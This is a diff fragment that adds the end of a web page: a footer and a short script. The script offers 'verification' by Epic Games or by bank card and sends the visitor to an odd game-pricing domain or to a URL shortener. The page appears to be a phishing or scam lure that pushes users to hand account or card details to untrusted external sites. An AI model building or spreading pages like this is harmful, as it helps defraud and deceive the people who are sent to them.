+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M4.98 3.5A2.5 2.5 0 1 1 5 8.5a2.5 2.5 0 0 1 0-5ZM3 9h4v12H3V9Zm6 0h3.8v1.7h.05c.53-1 1.83-2.05 3.75-2.05 4.02 0 4.75 2.65 4.75 6.1V21h-4v-5.4c0-1.29-.02-2.95-1.8-2.95-1.8 0-2.08 1.4-2.08 2.85V21H9V9Z"/></svg>
+        </a>
+      </div>
+
+    </div>
+  </div>
+</footer>
+
+<script>
+  const VERIFY_URLS = {
+    epic: 'https://fortprice.fun',
+    card: 'https://tinyurl.com/a7faumbm'
+  };
+
+  const options = document.querySelectorAll('.verify-option');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const verifyBtnText = document.getElementById('verifyBtnText');
+
+  let selectedMethod = null;
+
+  options.forEach(opt => {
+    opt.addEventListener('click', () => {
+      options.forEach(o => o.classList.remove('selected'));
+      opt.classList.add('selected');
+
+      selectedMethod = opt.dataset.method;
+
+      verifyBtn.disabled = false;
+      verifyBtnText.textContent = 'Verify with ' + (selectedMethod === 'epic' ? 'Epic Games' : 'Bank card');
+    });
+  });
+
+  verifyBtn.addEventListener('click', () => {
+    if (!selectedMethod) return;
+    const url = VERIFY_URLS[selectedMethod];
+    if (url) window.location.href = url;
+  });
+</script>
+
+</body>
+</html>
